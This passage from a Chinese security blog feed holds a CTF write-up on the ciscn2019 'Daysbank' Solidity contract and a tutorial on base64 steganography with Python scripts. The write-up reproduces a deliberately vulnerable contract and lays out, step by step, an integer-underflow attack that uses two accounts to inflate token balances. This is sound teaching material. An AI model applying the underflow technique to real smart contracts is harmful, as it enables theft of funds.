id="ciscn2019-daysbank"><a class="markdownIt-Anchor" href="#ciscn2019-daysbank"></a> 【ciscn2019】 Daysbank</h5><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.24</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">DaysBank</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balanceOf<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> gift<span class="token punctuation">;</span>    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>            <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span><span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">event</span> <span class="token function">SendFlag</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> flagnum<span class="token punctuation">,</span> <span class="token builtin">string</span> b64email<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">payforflag</span><span class="token punctuation">(</span><span class="token builtin">string</span> b64email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">SendFlag</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>b64email<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">getgift</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>gift<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>        gift<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> towhere<span class="token punctuation">,</span> <span class="token builtin">uint</span> howmuch<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>howmuch<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">>=</span>howmuch<span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">-=</span>howmuch<span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>towhere<span class="token punctuation">]</span><span class="token operator">+=</span>howmuch<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">profit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>gift<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>        gift<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">transfer2</span><span class="token punctuation">(</span><span class="token builtin">address</span> towhere<span class="token punctuation">,</span> <span class="token builtin">uint</span> howmuch<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>howmuch<span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">-</span>howmuch<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">-=</span>howmuch<span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>towhere<span class="token punctuation">]</span><span class="token operator">+=</span>howmuch<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析：</p><p>找到flag的函数payforflag（），观察得到，要想得到flag需要balanceof大于10w。</p><p>而transfer2（）函数中balanceOf[msg.sender]-howmuch&gt;0存在整数下溢的漏洞，因而可以利用。但是需要满足balanceOf[msg.sender]&gt;2的要求。</p><p>我们可以通过getgift()来获得一个代币，然后可以满足profit（）的要求，从而获得两个代币 ，此时balanceOf为2，gift为1。如果要达到balanceOf[msg.sender]&gt;2，那么需要利用transfer（）函数才能达到要求，transfer没有下溢的漏洞。</p><p>攻击过程：<br>先利用账号a，通过getgift()，然后利用profit（）函数，此时余额为2，gift为1.</p><p>然后再用账号b，重复该操作。</p><p>再将账号a利用transfer函数转给账号b两个代币。</p><p>然后再利用账号b调用transfer2转给账号a一个非常大的金额，达到溢出的效果，此时两个地址都可以执行flag函数。</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BASE64</title>
      <link href="/2023/10/20/BASE64/"/>
      <url>/2023/10/20/BASE64/</url>
      
        <content type="html"><![CDATA[<p>BASE64</p><pre class="line-numbers language-none"><code class="language-none">ZG&#x3D;&#x3D;YY&#x3D;&#x3D;aW&#x3D;&#x3D;ZF&#x3D;&#x3D;cm&#x3D;&#x3D;aM&#x3D;&#x3D;b2&#x3D;&#x3D;dc&#x3D;&#x3D;c2&#x3D;&#x3D;Zf&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解码得到 daidrhouse，然而编码得到</p><pre class="line-numbers language-none"><code class="language-none">ZA&#x3D;&#x3D;YQ&#x3D;&#x3D;aQ&#x3D;&#x3D;ZA&#x3D;&#x3D;cg&#x3D;&#x3D;aA&#x3D;&#x3D;bw&#x3D;&#x3D;dQ&#x3D;&#x3D;cw&#x3D;&#x3D;ZQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现每一串的第二位都发生了改变，但是结果没变。</p><h4 id="base64原理"><a class="markdownIt-Anchor" href="#base64原理"></a> base64原理</h4><p>顾名思义，base64编码就是用64个ascii字符作为基础来编码二进制内容的一种编码方式。相信各位一定在网页中看到过base64编码的内嵌图片，甚至QQ音乐传输歌词文件时，也采用了base64编码。将二进制编码为ascii字符，使数据在某些场景下更便于阅读、便于传输。当然，将所有二进制「浓缩」到区区64个字符来表示，一定会在体积上作出妥协。字符在编码完成后，会增大1/3倍。</p><p>由于只用到了<strong>64个字符</strong>，所以使用6个二进制位(2^6 = 64)完全可以把所有的字符表示出来，于是原来的1个字节8位在base64编码中变成了1个字节6位。</p><p>换言之：把原本的3个字节变成现在的4个字节，因为(<code>3*8 == 4*6</code>)</p><h4 id="索引表"><a class="markdownIt-Anchor" href="#索引表"></a> 索引表</h4><p>base64有一张标准编码表，为64个ascii字符排序并赋予索引。</p><table><thead><tr><th style="text-align:left">索引</th><th style="text-align:left">字符</th><th style="text-align:left">索引</th><th style="text-align:left">字符</th><th style="text-align:left">索引</th><th style="text-align:left">字符</th><th style="text-align:left">索引</th><th style="text-align:left">字符</th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">A</td><td style="text-align:left">16</td><td style="text-align:left">Q</td><td style="text-align:left">32</td><td style="text-align:left">g</td><td style="text-align:left">48</td><td style="text-align:left">w</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">B</td><td style="text-align:left">17</td><td style="text-align:left">R</td><td style="text-align:left">33</td><td style="text-align:left">h</td><td style="text-align:left">49</td><td style="text-align:left">x</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">C</td><td style="text-align:left">18</td><td style="text-align:left">S</td><td style="text-align:left">34</td><td style="text-align:left">i</td><td style="text-align:left">50</td><td style="text-align:left">y</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">D</td><td style="text-align:left">19</td><td style="text-align:left">T</td><td style="text-align:left">35</td><td style="text-align:left">j</td><td style="text-align:left">51</td><td style="text-align:left">z</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">E</td><td style="text-align:left">20</td><td style="text-align:left">U</td><td style="text-align:left">36</td><td style="text-align:left">k</td><td style="text-align:left">52</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">F</td><td style="text-align:left">21</td><td style="text-align:left">V</td><td style="text-align:left">37</td><td style="text-align:left">l</td><td style="text-align:left">53</td><td style="text-align:left">1</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left">G</td><td style="text-align:left">22</td><td style="text-align:left">W</td><td style="text-align:left">38</td><td style="text-align:left">m</td><td style="text-align:left">54</td><td style="text-align:left">2</td></tr><tr><td style="text-align:left">7</td><td style="text-align:left">H</td><td style="text-align:left">23</td><td style="text-align:left">X</td><td style="text-align:left">39</td><td style="text-align:left">n</td><td style="text-align:left">55</td><td style="text-align:left">3</td></tr><tr><td style="text-align:left">8</td><td style="text-align:left">I</td><td style="text-align:left">24</td><td style="text-align:left">Y</td><td style="text-align:left">40</td><td style="text-align:left">o</td><td style="text-align:left">56</td><td style="text-align:left">4</td></tr><tr><td style="text-align:left">9</td><td style="text-align:left">J</td><td style="text-align:left">25</td><td style="text-align:left">Z</td><td style="text-align:left">41</td><td style="text-align:left">p</td><td style="text-align:left">57</td><td style="text-align:left">5</td></tr><tr><td style="text-align:left">10</td><td style="text-align:left">K</td><td style="text-align:left">26</td><td style="text-align:left">a</td><td style="text-align:left">42</td><td style="text-align:left">q</td><td style="text-align:left">58</td><td style="text-align:left">6</td></tr><tr><td style="text-align:left">11</td><td style="text-align:left">L</td><td style="text-align:left">27</td><td style="text-align:left">b</td><td style="text-align:left">43</td><td style="text-align:left">r</td><td style="text-align:left">59</td><td style="text-align:left">7</td></tr><tr><td style="text-align:left">12</td><td style="text-align:left">M</td><td style="text-align:left">28</td><td style="text-align:left">c</td><td style="text-align:left">44</td><td style="text-align:left">s</td><td style="text-align:left">60</td><td style="text-align:left">8</td></tr><tr><td style="text-align:left">13</td><td style="text-align:left">N</td><td style="text-align:left">29</td><td style="text-align:left">d</td><td style="text-align:left">45</td><td style="text-align:left">t</td><td style="text-align:left">61</td><td style="text-align:left">9</td></tr><tr><td style="text-align:left">14</td><td style="text-align:left">O</td><td style="text-align:left">30</td><td style="text-align:left">e</td><td style="text-align:left">46</td><td style="text-align:left">u</td><td style="text-align:left">62</td><td style="text-align:left">+</td></tr><tr><td style="text-align:left">15</td><td style="text-align:left">P</td><td style="text-align:left">31</td><td style="text-align:left">f</td><td style="text-align:left">47</td><td style="text-align:left">v</td><td style="text-align:left">63</td><td style="text-align:left">/</td></tr></tbody></table><p>有时为了防止混淆（比如链接），会使用 <code>.</code> <code>_</code> 来代替索引表中的 <code>+</code> <code>/</code> 。</p><h4 id="隐写原理"><a class="markdownIt-Anchor" href="#隐写原理"></a> 隐写原理</h4><p>base64在解码的时候，会按照字符串末尾的 <code>=</code> 数量来删除相应字节数。或许你已经发现了，当一组字符的数量为1字节或2字节的时候，会有4位或2位二进制在解码时被忽略</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030924270.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030924272.png" alt></p><p>即解码时：</p><p>解密的时候首先把&quot;=&quot;删去，然后写出二进制数串，然后从左往右每8位一组，剩余的不足8位丢掉，然后根据转换表获得相应字符</p><p>然后每8位一组，剩余不足的丢弃，</p><p>也就是说红色部分会被忽略，所以即使对其进行改变，解码得到的结果依然不变。</p><p>解密得到的明文是不变的，那么你重新按照正确的加密流程计算一遍，如果发现结果不一样，那么就说明隐藏进了信息。</p><p>CTF题目中出现一大堆base64编码字符串的时候，更需要考虑base64隐写。</p><p>base64的解密脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> base64b64chars <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span><span class="token comment"># ccc.txt为待解密的base64隐写字符串所在的文件</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'base.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>base64str <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># pattern2用于匹配两个等号情况时，等号前的一个字符</span><span class="token comment"># pattern2用于匹配一个等号情况时，等号前的一个字符</span>pattern2 <span class="token operator">=</span> <span class="token string">r'(\S)==$'</span>pattern1 <span class="token operator">=</span> <span class="token string">r'(\S)=$'</span><span class="token comment"># 提取后的隐写二进制字符加入binstring中</span>binstring <span class="token operator">=</span> <span class="token string">''</span><span class="token comment"># 逐行读取待解密的base64隐写字符串，逐行处理</span><span class="token keyword">while</span><span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 先匹配两个等号的情况，如果匹配不上，再配置一个等号的情况</span>    <span class="token comment"># 如果无等号，则没有隐藏，无需处理</span>    <span class="token keyword">if</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>pattern2<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># mstr为等号前的一个字符，该字符为隐写二进制信息所在的字符</span>        mstr <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>pattern2<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token comment"># 确认mstr字符对应的base64二进制数，赋值给mbin</span>        mbin <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>b64chars<span class="token punctuation">.</span>find<span class="token punctuation">(</span>mstr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># mbin格式如0b100，mbin[0:2]为0b</span>        <span class="token comment"># mbin[2:].zfill(6)为将0b后面的二进制数前面补0，使0b后面的长度为6</span>        mbin2 <span class="token operator">=</span> mbin<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> mbin<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>        <span class="token comment"># 两个等号情况隐写了4位二进制数，所以提取mbin2的后4bit</span>        <span class="token comment"># 赋值给stegobin，这就是隐藏的二进制信息</span>        stegobin <span class="token operator">=</span> mbin2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        binstring <span class="token operator">+=</span> stegobin    <span class="token keyword">elif</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>pattern1<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">:</span>        mstr <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>pattern1<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        mbin <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>b64chars<span class="token punctuation">.</span>find<span class="token punctuation">(</span>mstr<span class="token punctuation">)</span><span class="token punctuation">)</span>        mbin2 <span class="token operator">=</span> mbin<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> mbin<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>        <span class="token comment"># 一个等号情况隐写了2位二进制数，所以提取mbin2的后2bit</span>        stegobin <span class="token operator">=</span> mbin2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        binstring <span class="token operator">+=</span> stegobin    base64str <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># stegobin将各行隐藏的二进制字符拼接在一起</span><span class="token comment"># 从第0位开始，8bit、8bit处理，所以range的步进为8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>binstring<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># int(xxx,2)，将二进制字符串转换为10进制的整数，再用chr()转为字符</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>binstring<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加密脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> reb64chars <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'3.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 读取所有行</span>flag <span class="token operator">=</span> <span class="token string">'c2tzZWN7QmFzZTY0aXNGNG59'</span>bin_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span>add <span class="token operator">=</span> <span class="token number">0</span>pattern2 <span class="token operator">=</span> <span class="token string">r'(\S)==$'</span>pattern1 <span class="token operator">=</span> <span class="token string">r'(\S)=$'</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'0.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> w<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>         line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> add <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 检查是否已处理完flag</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern2<span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">:</span>            tem <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern2<span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            tembin <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>b64chars<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tem<span class="token punctuation">)</span><span class="token punctuation">)</span>            tembin2 <span class="token operator">=</span> tembin<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> tembin<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>            steg <span class="token operator">=</span> tembin2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            tembin1 <span class="token operator">=</span> tembin2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> bin_str<span class="token punctuation">[</span>add<span class="token punctuation">:</span>add<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span>            stag <span class="token operator">=</span> b64chars<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>tembin1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            w<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> stag <span class="token operator">+</span> <span class="token string">'==\n'</span><span class="token punctuation">)</span>  <span class="token comment"># 使用 write 而不是 writelines，并添加换行符</span>            add <span class="token operator">+=</span> <span class="token number">4</span>        <span class="token keyword">elif</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern1<span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">:</span>            tem <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern1<span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            tembin <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>b64chars<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tem<span class="token punctuation">)</span><span class="token punctuation">)</span>            tembin2 <span class="token operator">=</span> tembin<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> tembin<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>            steg <span class="token operator">=</span> tembin2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            tembin1 <span class="token operator">=</span> tembin2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> bin_str<span class="token punctuation">[</span>add<span class="token punctuation">:</span>add<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>            stag <span class="token operator">=</span> b64chars<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>tembin1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            w<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> stag <span class="token operator">+</span> <span class="token string">'=\n'</span><span class="token punctuation">)</span>  <span class="token comment"># 使用 write 而不是 writelines，并添加换行符</span>            add <span class="token operator">+=</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="newstarctf-2023"><a class="markdownIt-Anchor" href="#newstarctf-2023"></a> NewstarCtf 2023</h4><h5 id="base"><a class="markdownIt-Anchor" href="#base"></a> base!</h5><p>脚本解码得到</p><p>iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</p><p>即flag{b4se_1s_4_g0od_c0d3}</p><h4 id="base家族"><a class="markdownIt-Anchor" href="#base家族"></a> base家族</h4><p><a href="http://www.atoolbox.net/Tool.php?Id=934">http://www.atoolbox.net/Tool.php?Id=934</a></p><p><a href="https://ctf.bugku.com/tools">https://ctf.bugku.com/tools</a></p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Re-Entrancy</title>
      <link href="/2023/10/19/Re-Entrancy/"/>
      <url>/2023/10/19/Re-Entrancy/</url>
      
